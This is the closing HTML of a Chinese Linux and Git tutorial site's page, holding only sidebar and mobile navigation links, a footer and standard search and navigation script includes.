class="sidebar-link">Git 常见场景</a><a href="/linux/7_git/Chapter04/index.html" class="sidebar-link">Git 多人协作</a><a href="/linux/7_git/Chapter05/index.html" class="sidebar-link">Git 集成使用禁忌</a><a href="/linux/7_git/Chapter06/index.html" class="sidebar-link">GitHub 初识</a><a href="/linux/7_git/Chapter07/index.html" class="sidebar-link">GitHub 使用</a><a href="/linux/7_git/Chapter03/index.html" class="sidebar-link">Github 同步</a><a href="/linux/7_git/Chapter08/index.html" class="sidebar-link">GitLab 实践</a>
  </div>
</aside>
    </div>
  </div>
</div>

    <footer id="footer" class="wrapper">
  <div class="inner">
    <div id="footer-copyright">
      &copy; 2025 <a href="https://github.com/BoobooWei" target="_blank">魏亚萍</a><br>
      Documentation licensed under <a href="http://creativecommons.org/licenses/by/4.0/" target="_blank">CC BY 4.0</a>.<br>
      备案号：沪ICP备2020026043号
    </div>
    <div id="footer-links">
      <a href="https://www.youtube.com/@amyreading2023" class="footer-link" target="_blank">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" 
            alt="YouTube"
            style="height:24px; margin-bottom:-6px;">
      </a>
      <a href="https://github.com/BoobooWei" class="footer-link" target="_blank"><i class="fa fa-github-alt"></i></a>
    </div>
  </div>
</footer>

  </div>
  <div id="mobile-nav-dimmer"></div>
  <nav id="mobile-nav">
  <div id="mobile-nav-inner">
    <ul id="mobile-nav-list">
      <a href="../../../docs/" class="mobile-nav-link">Hexo</a><a href="../../../news/" class="mobile-nav-link">News</a><a href="../../../api/" class="mobile-nav-link">MySQL8.0</a><a href="../../../database/" class="mobile-nav-link">Database</a><a href="../../../linux/" class="mobile-nav-link">Linux</a><a href="../../../cloud/" class="mobile-nav-link">Cloud</a><a href="../../../singapore/" class="mobile-nav-link">Singapore</a><a href="../../../amy/" class="mobile-nav-link">AMY</a><a href="../../../about/" class="mobile-nav-link">About</a>
      <li class="mobile-nav-item">
        <a href="https://github.com/BoobooWei" class="mobile-nav-link" rel="external" target="_blank">GitHub</a>
      </li>
    </ul>
    
      <strong class="mobile-nav-title">Linux 中级</strong><a href="/linux/0_linux_base/index.html" class="mobile-nav-link">概览</a><a href="/linux/0_linux_base/booboo_linux_base/index.html" class="mobile-nav-link">Linux 基础</a><a href="/linux/0_linux_base/booboo_easy_service/index.html" class="mobile-nav-link">Linux 简易服务</a><a href="/linux/0_linux_base/booboo_bash_shell_scripts/index.html" class="mobile-nav-link">Linux 脚本编程</a><a href="/linux/0_linux_base/booboo_middle_service/index.html" class="mobile-nav-link">Linux 进阶</a><strong class="mobile-nav-title">Linux 日常</strong><a href="/linux/1_linux_dayday/index.html" class="mobile-nav-link">概览</a><strong class="mobile-nav-title">Ex-Tools</strong><a href="/linux/2_excellent_tools/index.html" class="mobile-nav-link">概览</a><strong class="mobile-nav-title">LAMP</strong><a href="/linux/3_lamp/index.html" class="mobile-nav-link">概览</a><strong class="mobile-nav-title">Docker</strong><a href="/linux/4_docker/index.html" class="mobile-nav-link">概览</a><strong class="mobile-nav-title">TICK</strong><a href="/linux/5_tick/index.html" class="mobile-nav-link">概览</a><a href="/linux/5_tick/kapacitor/index.html" class="mobile-nav-link">Kapacitor</a><strong class="mobile-nav-title">Devops</strong><a href="/linux/6_devops/index.html" class="mobile-nav-link">概览</a><a href="/linux/6_devops/bootstrap/index.html" class="mobile-nav-link">Bootstrap</a><a href="/linux/6_devops/booboo_python/index.html" class="mobile-nav-link">Python 基础</a><a href="/linux/6_devops/00_python_base/index.html" class="mobile-nav-link">Python 进阶</a><a href="/linux/6_devops/01_python_net/index.html" class="mobile-nav-link">Python 网络开发</a><a href="/linux/6_devops/02_python_threads/index.html" class="mobile-nav-link">Python 并发编程</a><a href="/linux/6_devops/11_flask_admin/index.html" class="mobile-nav-link">Flask_admin</a><a href="/linux/6_devops/12_mini_project/index.html" class="mobile-nav-link">迷你小项目</a><strong class="mobile-nav-title">Git</strong><a href="/linux/7_git/index.html" class="mobile-nav-link">概览</a><a href="/linux/7_git/Chapter01/index.html" class="mobile-nav-link">Git 基础</a><a href="/linux/7_git/Chapter02/index.html" class="mobile-nav-link">Git 常见场景</a><a href="/linux/7_git/Chapter04/index.html" class="mobile-nav-link">Git 多人协作</a><a href="/linux/7_git/Chapter05/index.html" class="mobile-nav-link">Git 集成使用禁忌</a><a href="/linux/7_git/Chapter06/index.html" class="mobile-nav-link">GitHub 初识</a><a href="/linux/7_git/Chapter07/index.html" class="mobile-nav-link">GitHub 使用</a><a href="/linux/7_git/Chapter03/index.html" class="mobile-nav-link">Github 同步</a><a href="/linux/7_git/Chapter08/index.html" class="mobile-nav-link">GitLab 实践</a>
    
  </div>
  <div id="mobile-lang-select-wrap">
    <span id="mobile-lang-select-label"><i class="fa fa-globe"></i><span>English</span></span>
    <select id="mobile-lang-select" data-canonical="">
      
        <option value="en" selected>English</option>
      
    </select>
  </div>
</nav>
  <!-- Scripts -->
<!-- Cookie -->
<script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script>
<!-- build:js build/js/main.js -->

<script src="../../../js/lang_select.js"></script>


<script src="../../../js/mobile_nav.js"></script>

<!-- endbuild -->

<!-- Algolia -->
<!--   backup
<script src="https://cdn.jsdelivr.net/npm/@docsearch/js@3"></script>
<script type="text/javascript">
docsearch({
  appId: '',
  apiKey: '',
  indexName: '',
  insights: true,
  container: '#docsearch',
  debug: false,
  searchParameters: {
    facetFilters: ['lang:en']
  }
});
</script>
-->

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/docsearch.js@2/dist/cdn/docsearch.min.js"></script>
<script type="text/javascript">
document.getElementById('search-input-wrap').classList.add('on');
docsearch({
    apiKey: '',
    indexName: '',
    inputSelector: '#search-input'
});
</script>
</body>
</html>